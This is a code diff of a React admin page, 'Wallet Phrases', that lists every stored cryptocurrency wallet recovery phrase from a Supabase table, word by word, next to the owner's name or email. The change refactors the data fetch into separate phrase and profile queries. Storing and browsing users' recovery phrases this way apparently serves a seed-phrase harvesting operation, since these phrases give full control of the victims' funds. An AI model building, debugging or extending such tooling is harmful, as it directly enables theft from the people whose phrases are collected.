@@ -7,50 +7,68 @@ import { KeyRound } from "lucide-react";
 
 export default function PhrasesList() {
   const [rows, setRows] = useState<any[]>([]);
+  const [profileMap, setProfileMap] = useState<Record<string, any>>({});
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
     document.title = "Admin · Wallet Phrases";
-    (async () => {
-      const { data, error } = await supabase
-        .from("wallet_phrases")
-        .select(`
-          *,
-          profiles:user_id (
-            full_name,
-            email
-          )
-        `)
-        .order("created_at", { ascending: false });
 
-      if (error) {
-        console.error(error);
-        toast.error(error.message);
+    const fetchData = async () => {
+      try {
+        // 1. Fetch all wallet phrases (without the join)
+        const { data: phrases, error: phrasesError } = await supabase
+          .from("wallet_phrases")
+          .select("*")
+          .order("created_at", { ascending: false });
+
+        if (phrasesError) throw new Error(phrasesError.message);
+
+        // 2. Gather unique user_ids from the phrases
+        const userIds = [...new Set(phrases.map((p: any) => p.user_id).filter(Boolean))];
+
+        // 3. Fetch profiles for those user_ids (if any)
+        if (userIds.length > 0) {
+          const { data: profiles, error: profilesError } = await supabase
+            .from("profiles")
+            .select("id, full_name, email")
+            .in("id", userIds);
+
+          if (profilesError) throw new Error(profilesError.message);
+
+          // Build a lookup map: user_id -> profile
+          const map: Record<string, any> = {};
+          profiles.forEach((profile: any) => {
+            map[profile.id] = profile;
+          });
+          setProfileMap(map);
+        }
+
+        setRows(phrases || []);
+      } catch (err: any) {
+        toast.error(err.message);
+      } finally {
+        setLoading(false);
       }
+    };
 
-      setRows(data ?? []);
-      setLoading(false);
-    })();
+    fetchData();
   }, []);
 
   return (
     <div className="space-y-4">
       <div>
         <h1 className="text-2xl font-semibold">Wallet Phrases</h1>
-        <p className="text-sm text-muted-foreground">
-          {rows.length} phrases · contains highly sensitive data
-        </p>
+        <p className="text-sm text-muted-foreground">{rows.length} phrases · contains highly sensitive data</p>
       </div>
 
       {loading && <p className="text-muted-foreground">Loading…</p>}
-
-      {!loading && rows.length === 0 && (
-        <p className="text-muted-foreground">No phrases uploaded</p>
-      )}
+      {!loading && rows.length === 0 && <p className="text-muted-foreground">No phrases uploaded</p>}
 
       <div className="grid gap-4 md:grid-cols-2">
         {rows.map((p) => {
           const words = (p.phrase || "").trim().split(/\s+/);
+          const profile = profileMap[p.user_id] || {};
+
           return (
             <Card key={p.id}>
               <CardHeader className="pb-2">
@@ -59,20 +77,15 @@ export default function PhrasesList() {
                   {p.wallet_name || "Wallet"}
                 </CardTitle>
                 <p className="text-xs text-muted-foreground">
-                  {p.profiles?.full_name || p.profiles?.email || "—"} ·{" "}
+                  {profile?.full_name || profile?.email || p.user_id || "—"} ·{" "}
                   {new Date(p.created_at).toLocaleDateString()}
                 </p>
               </CardHeader>
               <CardContent>
                 <div className="grid grid-cols-3 gap-2 font-mono text-sm">
                   {words.map((w: string, i: number) => (
-                    <div
-                      key={i}
-                      className="rounded border border-border bg-muted/30 px-2 py-1"
-                    >
-                      <span className="mr-1 text-xs text-muted-foreground">
-                        {i + 1}.
-                      </span>
+                    <div key={i} className="rounded border border-border bg-muted/30 px-2 py-1">
+                      <span className="mr-1 text-xs text-muted-foreground">{i + 1}.</span>
                       {w}
                     </div>
                   ))}
